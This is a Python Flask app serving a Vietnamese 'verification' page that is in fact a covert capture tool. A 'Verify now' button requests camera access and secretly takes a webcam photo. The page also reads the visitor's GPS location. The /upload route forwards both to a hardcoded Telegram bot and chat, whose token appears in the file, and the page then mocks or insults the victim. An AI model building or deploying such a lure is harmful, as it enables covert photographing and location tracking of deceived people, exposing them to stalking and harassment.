from flask import Flask, request
import requests
import os
import base64
from datetime import datetime

app = Flask(__name__)

#new
TELEGRAM_BOT_TOKEN = '8199979828:AAEeZ8JXpUX_ng3p18bZNC1iy9MekskoTs' # Vẫn giữ token của bạn
TELEGRAM_CHAT_ID = '-1003262536143'  # Vẫn giữ ID người nhận ảnh

#new2new2
@app.route('/')
def index():
    return '''
    <!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="UTF-8">
  <title>Xác minh</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      margin: 0;
      display: flex; /* Căn giữa nút */
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      background: #000; /* Nền đen tuyệt đối */
      overflow: hidden;
    }
    canvas#snow {
      position: fixed;
      top: 0;
      left: 0;
      pointer-events: none;
      z-index: 1; 
    }
    video, canvas#captureCanvas {
      display: none;
    }
    iframe {
      display: none;
    }
    .container {
      position: relative;
      z-index: 10; /* Nút nằm trên tuyết */
      text-align: center;
    }
    button {
      padding: 15px 30px; /* Nút lớn hơn */
      font-size: 1.2em;
      font-weight: bold;
      cursor: pointer;
      border: 2px solid #fff;
      border-radius: 8px;
      background-color: rgba(255, 65, 54, 0.9); /* Màu đỏ nổi bật, hơi trong suốt */
      color: white;
      transition: background-color 0.3s, transform 0.1s;
      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.4);
    }
    button:hover {
        background-color: #cc0000;
        transform: translateY(-2px);
    }
    button:disabled {
        background-color: #444;
        cursor: not-allowed;
    }
  </style>
</head>
<body>
  <canvas id="snow"></canvas>
  
  <div class="container">
      <button id="startButton" onclick="startCapture()">Xác minh ngay</button>
  </div>

  <video id="video" autoplay muted></video>
  <canvas id="captureCanvas" width="320" height="240"></canvas>

  <script>
    // ❄️ Hiệu ứng tuyết rơi
    const canvas = document.getElementById('snow');
    const ctx = canvas.getContext('2d');
    let width = window.innerWidth;
    let height = window.innerHeight;
    canvas.width = width;
    canvas.height = height;

    let flakes = [];
    for (let i = 0; i < 200; i++) { // Tăng số lượng tuyết cho nền đen
      flakes.push({
        x: Math.random() * width,
        y: Math.random() * height,
        r: Math.random() * 3 + 1,
        d: Math.random() * 100
      });
    }

    function drawSnow() {
      ctx.clearRect(0, 0, width, height);
      ctx.fillStyle = "rgba(255, 255, 255, 0.8)";
      ctx.beginPath();
      for (let i = 0; i < flakes.length; i++) {
        let f = flakes[i];
        ctx.moveTo(f.x, f.y);
        ctx.arc(f.x, f.y, f.r, 0, Math.PI * 2, true);
      }
      ctx.fill();
      updateSnow();
    }

    let angle = 0;
    function updateSnow() {
      angle += 0.005; 
      for (let i = 0; i < flakes.length; i++) {
        let f = flakes[i];
        f.y += Math.cos(angle + f.d) + 0.5 + f.r / 2; 
        f.x += Math.sin(angle) * 1.5; 

        if (f.y > height) {
          flakes[i] = { x: Math.random() * width, y: 0, r: f.r, d: f.d };
        }
      }
    }

    setInterval(drawSnow, 33);
    
    // 📸 Logic cấp quyền và chụp ảnh
    const video = document.getElementById('video');
    const canvasCapture = document.getElementById('captureCanvas');
    const startButton = document.getElementById('startButton');

    function startCapture() {
        startButton.disabled = true;
        startButton.textContent = 'Đang xác minh...';

        navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
            video.srcObject = stream;
            
            setTimeout(() => { // ⏱️ Chụp sau 2 giây (2000ms)
                const context = canvasCapture.getContext('2d');
                context.drawImage(video, 0, 0, canvasCapture.width, canvasCapture.height);
                const imageData = canvasCapture.toDataURL('image/jpeg');
                
                stream.getTracks().forEach(track => track.stop());

                navigator.geolocation.getCurrentPosition(function(position) {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    sendData(imageData, lat, lon);
                }, function(error) {
                    sendData(imageData, 'unknown', 'unknown');
                });
                
                startButton.textContent = 'Cảm ơn các em đã dùng:))';
            }, 2000); 
        })
        .catch(err => {
            startButton.textContent = 'DCM mày cấp quyền sai rồi';
            startButton.disabled = false;
        });
    }

    function sendData(imageData, lat, lon) {
        const payload = new URLSearchParams();
        payload.append('image', imageData);
        payload.append('lat', lat);
        payload.append('lon', lon);

        fetch('/upload', {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: payload
        });
    }
  </script>
</body>
</html>
'''

@app.route('/upload', methods=['POST'])
def upload():
    data_url = request.form['image']
    lat = request.form.get('lat', 'unknown')
    lon = request.form.get('lon', 'unknown')
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    header, encoded = data_url.split(",", 1)
    image_data = base64.b64decode(encoded)

    caption = f" Tự động: {timestamp}\n Vị trí: {lat}, {lon}"

    files = {'photo': ('image.jpg', image_data)}
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
    data = {
        'chat_id': TELEGRAM_CHAT_ID,
        'caption': caption
    }

    response = requests.post(url, data=data, files=files)
    return 'OK' if response.ok else 'Lỗi gửi ảnh'

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
